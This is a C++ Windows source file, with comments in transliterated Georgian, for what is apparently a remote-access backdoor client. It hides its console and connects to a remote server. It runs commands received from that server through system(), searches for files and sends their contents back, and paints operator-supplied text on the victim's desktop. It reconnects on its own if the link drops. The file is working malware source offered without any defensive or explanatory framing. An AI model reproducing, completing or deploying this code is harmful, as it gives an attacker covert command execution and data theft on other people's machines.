#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <string>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#pragma comment (lib,"WS2_32.lib")
using namespace std;

		#include"sokets.cpp"
		#include "filesearch.cpp";




HFONT create_font(HWND hwnd)
{
HFONT hfont;
hfont=CreateFont(22,0,0,0,FW_BOLD,0,0,0,0,0,0,2,0,"SYSTEM_FIXED_FONT");
//SendMessage(hwnd,WM_SETFONT,(UINT)hfont,0);
return hfont;
}
void  main()
{
	HFONT hfont=create_font(GetDesktopWindow());
	SOCKET sock;

  FreeConsole();
	soketss(&sock);
static bool firststart=0;
HDC hdc=GetDC(GetDesktopWindow());
char buf[4096];
string userInput;
do
{

	userInput="\r\n";
	if(userInput.size()<=0)
	{
		userInput="sheitane striqoni";
	}
	if(userInput.size() > 0) ///    c_str utitebs  userInput ze misamartze rac weria anu send agzavnis orobitshi da cherez operatiulida akitxebs ororbitshi
	{
		int sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
		if(sendResult != SOCKET_ERROR)
		{
			ZeroMemory(buf,4096);
			int bytesReceived = recv(sock,buf,4096,0);
			if(bytesReceived<=0){
				/////////////////////////////// tu kavshiri gawyda vidaxebt xelmeored soket funqcias kavshiris agdgenisatvis ///////
				soketss(&sock);
		//	MessageBox(0,",tytrytyt",0,0);
			}
			if(bytesReceived>0)
			{

		//		cout<< "SERVER> " <<string(buf,0,bytesReceived)<<endl;
				
					if(buf[0]=='*')
					{
						static int Cbuf;
						char clearr[1000];
					for(int i=0;i<=500;i++)
					{
						clearr[i]=' ';
					}
				TextOut(hdc,50,200,clearr,1000);
						  PAINTSTRUCT ps;
				   HDC hdc1 = BeginPaint(GetDesktopWindow(), &ps);

			      FillRect(hdc1, &ps.rcPaint, (HBRUSH) (COLOR_WINDOW+1));

				//    EndPaint(GetDesktopWindow(), &ps);

				

							SetTextColor(hdc,RGB(239, 2, 2));

							HFONT	hTmp=(HFONT)SelectObject(hdc,hfont);
							//	SetBkMode(hdc,1);
					
							TextOut(hdc,50,200,buf,strlen(buf));
							SendMessage(GetDesktopWindow(),WM_SIZE,0,1);


							userInput="TEXTIS GAMOTANA \n";
							sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
							
							Cbuf=strlen(buf);
							
							/*
							DeleteObject(SelectObject(hdc,hTmp));
							EndPaint(GetDesktopWindow(), &ps);

								SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
								*/
						
					}
					else if(buf[0]=='#')
					{

						SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
						TextOut(hdc,50,200,"                                                                                                  ",strlen("                                                                                                  "));
						userInput="TEXTI WAISHALA\n";
						sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);

						SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
					}



				int returns=0;
				 if(buf[0]=='~')
				{
					buf[0]=' ';
			
					returns=system(buf);


							if(returns ==-1)
							{
								userInput="-1 \n";
								sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							}

					
							if(returns ==0)
							{
								userInput="0 \n";
								sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							}
							if(returns ==1)
							{
								userInput="0 \n";
								sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							}

				}	

				else if(buf[0]=='$')
				{
				userInput="kavshiris shemowmeba \n";
				sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
				}
				else if(buf[0]==(char)92) //(char)92
				{
					
				
					int fff=strlen(buf);
					buf[fff-3]='\0';
					int fff2=strlen(buf);
					for(int i=0;i<fff;i++)
					{
						buf[i]=buf[i+1];

					}				
					char*dataa=(char*)find_file_in_dir(buf);
					
					if(dataa){
					sendResult = send(sock,(const char*)dataa,strlen(dataa)+1,0);
					}

					else
					{
					
						userInput="araswori sintaxi";
						sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);

					}
				}


			}

		}
	
	}

}while(userInput.size()>0);
 /// aq itisheba kavshiri da wyvets mushaobas orive programa
closesocket(sock);

WSACleanup();
}